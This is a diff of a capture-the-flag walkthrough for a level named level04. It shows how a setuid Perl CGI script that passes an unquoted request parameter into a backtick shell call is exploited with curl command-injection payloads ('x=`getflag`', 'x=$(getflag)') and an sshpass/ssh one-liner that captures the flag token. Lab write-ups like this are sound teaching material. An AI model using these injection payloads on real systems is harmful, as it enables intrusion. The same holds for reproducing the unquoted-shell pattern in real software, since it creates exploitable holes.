@@ -2,24 +2,27 @@
 
 ## Steps
 
-1. __Action__ (Guest): list the files present at the root
+1. __Action__ (Guest): list the files present in the `level04` user's home directory
 	```sh
 	ls -A
 	```
 
-2. __Observation__ (Guest): the previous command reveals a Perl file
-	```sh
-	.bash_logout  .bashrc  level04.pl  .profile
+2. __Observation__ (Guest): the previous command reveals 1 file possibly of interest,
+	named `level04.pl`
+	```
+	.bash_logout  .bashrc  .profile  level04.pl
 	```
 
-3. __Action__ (Guest): get more information on the file
+3. __Action__ (Guest): check the file access control list of the `level04.pl` file
 	```sh
 	getfacl level04.pl
 	```
 
-4. __Observation__ (Guest): the previous command reveals that the `level04.pl`
-	file is a script, readable and executable by all, writable by the `level04`
-	user and has the `setuid` and the `setgid` bits set.
+4. __Observation__ (Guest): the previous command reveals that the `level04.pl` file:
+	- is readable by the `level04` user
+	- is executable by the `level04` user
+	- is owned by the `flag04` user
+	- has the `setuid` bit enabled
 	```
 	# file: level04.pl
 	# owner: flag04
@@ -30,26 +33,17 @@
 	other::r-x
 	```
 
-5. __Action__ (Guest): run the script
-	```sh
-	./level04.pl
-	```
-
-6. __Observation__ (Guest): nothing much happens, some text is displayed
-	on stdout
-	```sh
-	Content-type: text/html
-
-
-	```
-
-7. __Action__ (Guest): check the content of the file
+5. __Action__ (Guest): print the content of the `level04.pl` file
 	```sh
 	cat level04.pl
 	```
 
-8. __Observation__ (Guest): the previous command reveals the content 
-	of the file
+6. __Observation__ (Guest): the previous command reveals that the `level04.pl` file is a Perl script
+	that runs an HTTP server on localhost on port 4747, which, foreach incoming request,
+	takes the value of the `x` parameter (empty if not provided) and prints it via a shell command
+	(``print `echo $y 2>&1`;``).  
+	Note that the `$y` variable is unquoted when passed to the `echo` command, which means that
+	we can inject shell commands in the `x` parameter
 	```perl
 	#!/usr/bin/perl
 	# localhost:4747
@@ -61,23 +55,13 @@
 	}
 	x(param("x"));
 	```
-	- The server is ran on localhost on the port 4747
-	- The param is imported from the CGI module
-	- The web server is informed the content sent back to the browser is HTML
-	- There's a subroutine that takes the first argument given and prints it
-	- The parameter passed is stored in a variable named `x`
 
-9. __Action__ (Host): since the subroutine in `level04.pl` accepts a `x`
-	variable, we pass the `getflag` comamnd to `x`.
+7. __Action__ (Host): send a request to the server with a malicious `x` parameter value
+	to exploit the shell command injection described above, invoking the `getflag` command,
+	and save the token to the `flag` file
 	```sh
-	curl http://localhost:4747 -d 'x=`getflag`'
-	```
-	It also works like this
-	```sh
-	curl http://localhost:4747 -d 'x=$(getflag)'
-	```
-
-10. __Observation__ (Host): the following sentence is displayed on the stdout
-	```sh
-	Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+	sshpass -f level03/flag 2>/dev/null \
+		ssh -p 4242 level04@192.168.122.214 \
+			"curl http://localhost:4747 -d 'x=\$( getflag )'" \
+	| egrep -o '[^ ]+$' >level04/flag
 	```
